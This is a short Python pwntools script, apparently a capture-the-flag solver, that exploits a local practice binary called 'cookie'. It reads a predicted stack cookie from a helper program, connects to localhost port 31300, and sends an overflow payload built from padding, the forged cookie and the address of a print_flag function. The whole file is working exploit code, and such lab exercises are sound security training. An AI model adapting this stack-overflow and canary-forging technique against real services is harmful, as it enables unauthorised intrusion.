#!/usr/bin/python3
from pwn import *

e = ELF("./cookie")
print_flag = e.symbols['print_flag']
rand = process("./tests/gen_cookie")
#p = process("./cookie")
p = remote("localhost", 31300)

stack_cookie = rand.recv()
#p.recv()

sleep(5)
for i in range(51):
    p.sendline("4")
payload = b"A" * (0x20 - 0x4) + p32(int(stack_cookie.strip())) + p64(0) + p64(print_flag)
p.sendline(payload)
p.interactive()
print(int(stack_cookie.strip()))

